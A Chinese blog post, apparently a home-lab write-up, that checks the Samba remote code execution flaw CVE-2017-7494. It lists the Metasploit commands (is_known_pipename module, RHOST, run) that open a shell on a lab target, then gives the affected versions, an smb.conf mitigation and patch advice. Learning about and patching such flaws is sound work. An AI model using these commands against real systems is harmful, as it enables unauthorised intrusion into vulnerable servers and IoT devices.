# Samba CVE-2017-7494 验证实验 - .Ding - 博客园

> 原文：[`www.cnblogs.com/meandme/p/11690948.html`](https://www.cnblogs.com/meandme/p/11690948.html)

**漏洞简介**

Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个软件，不少 IoT 设备也使用了 Samba。2017 年 5 月 24 日 Samba 发布了 4.6.4 版本，修复了一个严重的远程代码执行漏洞，漏洞编号 CVE-2017-7494，攻击者可以利用该漏洞在目标服务器上执行任意代码。2017 年 5 月 25 日 hdm 给 metasploit 提交了该漏洞的 exp。2017 年 5 月 25 日 openwrt 发布了针对该漏洞的修复补丁，许多 IoT 设备同样受该漏洞影响。

**测试环境**
攻击机：kali                                    IP：192.168.0.10
靶   机：debian                              IP：192.168.0.20
服务：samba: 4.5

**漏洞验证**

启动 Kali 执行命令：

msfconsole

msf > use exploit/linux/samba/is_known_pipename

set RHOST 192.168.0.20

run

进入目标系统并查看文件：

cd /  ls
验证完成

**影响版本：**Samba：3.5     <4.6.4     <4.5.10     <4.4.14。4.6.4/4.5.10/4.4.14 已修复此漏洞。**修复建议：**
1、临时方案
在 smb.conf 的[global]节点下增加 nt pipe support = no 选项，重新启动 samba 服务。

2、官方修复
Samba 已发布新版本，可通过更新版本解决。**补丁下载**
https://www.samba.org/

**此实验仅供学习参考,不得用于其他任何目的，其他违法行为本人不负任何责任,在此申明!**